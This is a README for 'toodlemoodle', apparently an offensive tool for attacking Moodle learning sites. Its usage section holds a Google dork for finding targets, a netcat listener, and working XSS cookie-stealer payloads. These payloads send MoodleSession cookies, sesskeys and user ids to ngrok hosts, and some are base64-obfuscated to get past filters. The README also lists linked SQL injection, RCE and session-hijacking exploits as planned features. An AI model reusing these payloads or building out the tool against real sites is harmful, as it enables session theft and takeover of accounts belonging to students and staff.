# toodlemoodle

TODO: Write a description here

## Installation

TODO: Write installation instructions here

## Usage
Google dork: This files describes API changes in core libraries and APIs inurl:lib/upgrade.txt

TODO: Write usage instructions here
Thanks moodle for giving code to pwn self:
https://docs.moodle.org/dev/Security:Cross-site_scripting
while true; do nc -l 9999; done

My cookie stealer:
<script>alert('xss');document.write('<img src="https://668da81e.ngrok.io/?cookie=' + document.cookie + '" />')</script>

<script>document.write('<img src="https://5fc418e2.ngrok.io/?session=' + document.cookie.match(new RegExp('(^| )MoodleSession=([^;]+)'))[2] + "&sesskey=" + M.cfg.sesskey + "&id=" + document.querySelectorAll('[data-userid]')[0].getAttribute("data-userid") + '" />')</script>

https://blog.innerht.ml/tag/clickjacking/ good demo of a button that follows the mouse.

https://moodle.org/mod/forum/discuss.php?d=384010 3.6 login as, hijack admin account

https://www.cvedetails.com/cve/CVE-2018-1045/ 3.3.4 XSS in calendar event name

https://moodle.org/mod/forum/discuss.php?d=345915 3.2.1 xss via url

POC:
http://localhost/mod/assign/view.php?id=2&action=view"onload="document.body.appendChild(document.createElement('img')).src=('https://5fc418e2.ngrok.io/?session='.concat(document.cookie,'|',M.cfg.sesskey))

Encode payload in base64 then: 

"onload="eval(window.atob('ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbWcnKSkuc3JjPSgnaHR0cHM6Ly81ZmM0MThlMi5uZ3Jvay5pby8/c2Vzc2lvbj0nLmNvbmNhdChkb2N1bWVudC5jb29raWUsJ3wnLE0uY2ZnLnNlc3NrZXkpKQ=='))

or if eval is filtered:

"onload="new Function(window.atob('ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdpbWcnKSkuc3JjPSgnaHR0cHM6Ly81ZmM0MThlMi5uZ3Jvay5pby8/c2Vzc2lvbj0nLmNvbmNhdChkb2N1bWVudC5jb29raWUsJ3wnLE0uY2ZnLnNlc3NrZXkpKQ=='))()

https://moodle.org/mod/forum/discuss.php?d=381230 3.6 could use a clickhijack to self

https://moodle.org/mod/forum/discuss.php?d=384011 3.6 (fresh!) enum events

https://www.cvedetails.com/cve/CVE-2017-2641/ used by exploit below

https://www.exploit-db.com/exploits/41828 3.2.1 SQL injection

https://www.exploit-db.com/exploits/46551 3.4.1 RCE, CVE below

https://www.cvedetails.com/cve/CVE-2018-1133/ 3.4.2 remote code exec for teacher "Calculated question"

fresher:

https://www.cvedetails.com/cve/CVE-2018-14630/ 3.5.2 remote code exec for (teacher?) "quiz import"

Features:
1. scan: detect version (working!), suggest supported exploits
2. view calendar events bypass
3. exploit quiz import and calculated question vulns
4. exploit 2018-1133 RCE
5. exploit 2017-2641 SQL injection (via user pref) (generate sqlmap command)
6. add xss to account dashboard, generate clickjacker, using CVE-2019-3810 or CVE-2019-3847 to hijack session
7. add xss to calendar, generate link for victim to click and steal sesh

## Development

TODO: Write development instructions here
Make sure you have crystal & openssl installed. For MacOs, run
```
brew install crystal openssl
```

It is critical to compile this project, that you add the following lines to your bash_profile or zshrc:
```
export PKG_CONFIG_PATH="/usr/local/opt/openssl/lib/pkgconfig:$PKG_CONFIG_PATH"
export LDFLAGS="-L/usr/local/opt/libffi/lib -L/usr/local/opt/openssl/lib -L/usr/local/opt/llvm@6/lib -Wl,-rpath,/usr/local/opt/llvm@6/lib -L/usr/local/opt/llvm@6/lib $LDFLAGS"
export CPPFLAGS="-I/usr/local/opt/openssl/include -I/usr/local/opt/llvm@6/include $CPPFLAGS"
```

This adds LLVM, LibFFI, and OpenSSL to your compiler flags.

Now you can run this project (this will compile the project, hence the long startup time): 
```
crystal run src/toodlemoodle.cr
```

You can also build an executable:
```
crystal build src/toodlemoodle.cr
```
Use the  --release flag for an optimized production build.

## Contributing

1. Fork it (<https://github.com/your-github-user/toodlemoodle/fork>)
2. Create your feature branch (`git checkout -b my-new-feature`)
3. Commit your changes (`git commit -am 'Add some feature'`)
4. Push to the branch (`git push origin my-new-feature`)
5. Create a new Pull Request

## Contributors

- [Claudio Spiess](https://github.com/your-github-user) - creator and maintainer
